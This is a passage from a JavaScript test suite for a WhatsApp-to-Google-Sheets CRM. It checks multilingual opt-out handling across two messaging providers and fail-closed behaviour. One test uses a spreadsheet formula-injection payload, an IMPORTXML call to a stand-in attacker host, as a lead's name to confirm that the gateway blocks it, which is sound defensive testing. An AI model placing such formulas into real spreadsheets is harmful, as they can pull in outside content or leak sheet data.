    restoreEnv(envSnap);
  });

  it('F34-BONUS-01: Hindi (रोकें) & Marathi (थांबवा) opt-out preserved across Meta and ChatMitra; missing ChatMitra opt-out msgId fails closed 502', async () => {
    wireLocalWorkerFetch();
    process.env.CHATMITRA_INBOUND_AUTO_REPLY_ENABLED = 'true';
    process.env.WHATSAPP_INBOUND_AI_REPLY_ENABLED = 'true';

    // Hindi opt-out via ChatMitra on shared /api/whatsapp-webhook with valid outbound ack ID
    axios.post = async () => ({ status: 200, data: { id: 'cm_opt_ack_hi_5h35' } });
    const rHi = await metaWebhookRoute.POST(
      makeSharedWebhookRequest({ event: 'message.received', id: 'cm_opt_hi_5h35', from: AUTH_DIGITS, text: 'रोकें' })
    );
    assert.equal(rHi.status, 200);
    assert.equal((await sheets.customerRepository.findByMobile(AUTH_PHONE)).record_status, 'OPTED_OUT');

    // Marathi opt-out via Meta with valid ack
    setupMockEnv();
    wireLocalWorkerFetch();
    process.env.WHATSAPP_INBOUND_AI_REPLY_ENABLED = 'true';
    axios.post = async () => ({ status: 200, data: { messages: [{ id: 'wamid.opt_ack_mr_5h35' }] } });
    const rMr = await metaWebhookRoute.POST(
      makeSharedWebhookRequest(
        {
          object: 'whatsapp_business_account',
          entry: [{ changes: [{ value: { messages: [{ id: 'wamid.opt_mr_5h35', from: AUTH_DIGITS, type: 'text', text: { body: 'थांबवा' } }] } }] }]
        },
        { secret: META_SECRET, header: 'x-hub-signature-256', prefix: 'sha256=' }
      )
    );
    assert.equal(rMr.status, 200);
    assert.equal((await sheets.customerRepository.findByMobile(AUTH_PHONE)).record_status, 'OPTED_OUT');

    // ChatMitra opt-out where provider returns HTTP 200 WITHOUT messageId -> fails closed 502 UNKNOWN_PROVIDER_OUTCOME
    setupMockEnv();
    process.env.CHATMITRA_INBOUND_AUTO_REPLY_ENABLED = 'true';
    axios.post = async () => ({ status: 200, data: { ok: true } });
    const rNoAckId = await workerRoute.POST(
      makeWorkerRequest({
        eventId: 'CM_INBOUND_opt_noid',
        eventType: 'INBOUND_MESSAGE',
        provider: 'ChatMitra',
        correlationId: 'CORR-OPT-NOID',
        data: {
          fromPhone: AUTH_PHONE,
          msgId: 'cm_opt_noid_1',
          message: { type: 'text', text: { body: 'STOP' }, id: 'cm_opt_noid_1' }
        }
      })
    );
    assert.equal(rNoAckId.status, 502);
    const dNoAck = await rNoAckId.json();
    assert.equal(dNoAck.error, 'UNKNOWN_PROVIDER_OUTCOME');
    assert.equal(dNoAck.persisted, false);
  });

  it('F34-BONUS-02: Zero MongoDB/PostgreSQL loads across entire suite and formula injection blocked through gateway.gs VM', async () => {
    const vmHarness = createGatewayVmHarness();
    process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'APPS_SCRIPT_GATEWAY';
    delete process.env.GOOGLE_SHEETS_ENABLE_MOCK;
    process.env.GOOGLE_SHEETS_GATEWAY_URL = 'https://script.google.com/macros/s/t5h35-formula/exec';
    process.env.GOOGLE_SHEETS_GATEWAY_SECRET = GATEWAY_SECRET;
    globalThis.fetch = vmHarness.gatewayFetch;

    await assert.rejects(
      () =>
        sheets.CrmSheetsService.registerOrUpdateCustomerLead({
          name: '=IMPORTXML("http://evil.example","//a")',
          phone: AUTH_PHONE,
          loanCategory: 'Personal Loan'
        }),
      (err) => err instanceof sheets.SheetsCrmError
    );

    assert.equal(mongoLoadAttempts, 0, 'Zero MongoDB module loads allowed in canonical CRM path');
    assert.equal(pgLoadAttempts, 0, 'Zero PostgreSQL module loads allowed in canonical CRM path');
  });
});
